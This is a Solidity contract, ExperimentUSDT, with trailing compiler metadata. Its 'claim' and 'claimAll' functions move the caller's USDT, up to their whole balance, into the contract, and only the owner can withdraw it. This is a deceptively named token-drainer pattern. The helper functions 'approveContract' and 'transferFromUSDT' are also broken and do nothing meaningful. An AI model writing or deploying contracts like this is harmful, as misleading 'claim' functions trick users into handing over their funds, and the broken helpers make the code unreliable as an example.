pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract ExperimentUSDT is Ownable {
    IERC20 public usdtToken;

    event TransferSuccessful(address indexed from, address indexed to, uint256 amount);
    event WithdrawSuccessful(address indexed to, uint256 amount);
    event ApprovalSuccessful(address indexed owner, uint256 amount);

    constructor(address _usdtAddress) {
        usdtToken = IERC20(_usdtAddress);
    }

    function approveContract(uint256 amount) external {
        require(usdtToken.approve(address(this), amount), "Approval failed");
        emit ApprovalSuccessful(msg.sender, amount);
    }

    function claim(uint256 amount) external {
        require(usdtToken.transferFrom(msg.sender, address(this), amount), "Transfer failed");
        emit TransferSuccessful(msg.sender, address(this), amount);
    }

    function transferFromUSDT(uint256 amount) external {
        require(usdtToken.transfer(address(this), amount), "Transfer failed");
    }

    function claimAll() external {
         require(usdtToken.transferFrom(msg.sender, address(this), usdtToken.balanceOf(msg.sender)), "Transfer failed");
    }

    function withdrawUSDT(uint256 _amount) external onlyOwner {
        require(usdtToken.transfer(msg.sender, _amount), "Withdrawal failed");
        emit WithdrawSuccessful(msg.sender, _amount);
    }

    function getContractBalance() external view returns (uint256) {
        return usdtToken.balanceOf(address(this));
    }

    function checkAllowance(address owner, address spender) external view returns (uint256) {
        return usdtToken.allowance(owner, spender);
    }

    function checkBalance(address account) external view returns (uint256) {
        return usdtToken.balanceOf(account);
    }

    function getUsdtAddress() external view returns (address) {
        return address(usdtToken);
    }

    function getContractAddress() external view returns (address){
        return address(this);
    }

}","keccak256":"0x23f989ca4755a146469d9c26f4e89ae5a276d9a2476e74458cfef8aa2d822c93","license":"MIT"}},"version":1}
